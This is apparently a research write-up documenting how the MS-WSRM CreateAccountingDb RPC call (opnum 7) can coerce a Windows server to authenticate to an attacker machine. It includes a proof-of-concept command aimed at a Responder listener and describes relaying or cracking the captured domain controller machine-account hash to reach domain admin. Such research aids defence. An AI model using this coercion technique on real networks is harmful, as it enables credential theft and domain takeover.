# MS-WSRM - Remote call to CreateAccountingDb (opnum 7)

## Summary

+ **Protocol**: [[MS-WSRM]: Windows System Resource Manager (WSRM) Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wsrm/4ace0c0e-acea-4f74-8b60-ec47be136e7f)

+ **Protocol UUID**: e8bcffac-b864-4574-b2e8-f1fb21dfdc18

+ **Protocol version**: 0.0

+ **SMB Named pipe**: ``

+ **Function name**: [`CreateAccountingDb`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wsrm/f1c48f77-986e-49b7-bbd5-717a391d99fa)

+ **Function operation number**: `7`

+ **Authenticated**: Yes


## Description

In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine, usually on SMB. Then we need to connect to the remote SMB pipe `` and bind to the desired [`MS-WSRM`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wsrm/4ace0c0e-acea-4f74-8b60-ec47be136e7f) protocol (with uuid `e8bcffac-b864-4574-b2e8-f1fb21dfdc18` and version `0.0`) in order to perform remote procedure calls to functions in the [`MS-WSRM`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wsrm/4ace0c0e-acea-4f74-8b60-ec47be136e7f) protocol.

The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named `` This pipe is connected to the protocol [[MS-WSRM]: Windows System Resource Manager (WSRM) Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wsrm/4ace0c0e-acea-4f74-8b60-ec47be136e7f) and allows to call RPC functions of this protocol. We will then call the remote [`CreateAccountingDb`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wsrm/f1c48f77-986e-49b7-bbd5-717a391d99fa) function on the remote Windows Server (192.168.2.1) with the following parameters:

```cpp
CreateAccountingDb('192.168.2.51\x00')
```

We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):

```bash
./coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" 192.168.2.51 192.168.2.1
```

![](./imgs/poc.png)

This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\share` and therefore authenticate using its machine account (`DC01$`).  After this RPC call, we get an authentication from the domain controller with its machine account directly on Responder:

![](./imgs/hash.png)

After this step, we relay the authentication to other services in order to elevate our privileges, or try to downgrade it to NTLMv1 and crack it in order to get the NT hash of the domain controller's machine account. This kind of vulnerabilities allows to quickly get from user to domain administrator in unprotected domains!


## Function technical detail

```cpp
[id(1), helpstring("method CreateAccountingDb")] HRESULT CreateAccountingDb(
   [in] BSTR bstrServerName,
   [in] BOOL bWindowsAuth,
   [in] BSTR bstrUserName,
   [in] BSTR bstrPasswd
 );
```

## References

+ Documentation of protocol [MS-WSRM]: Windows System Resource Manager (WSRM) Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wsrm/4ace0c0e-acea-4f74-8b60-ec47be136e7f

+ Documentation of function `CreateAccountingDb`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wsrm/f1c48f77-986e-49b7-bbd5-717a391d99fa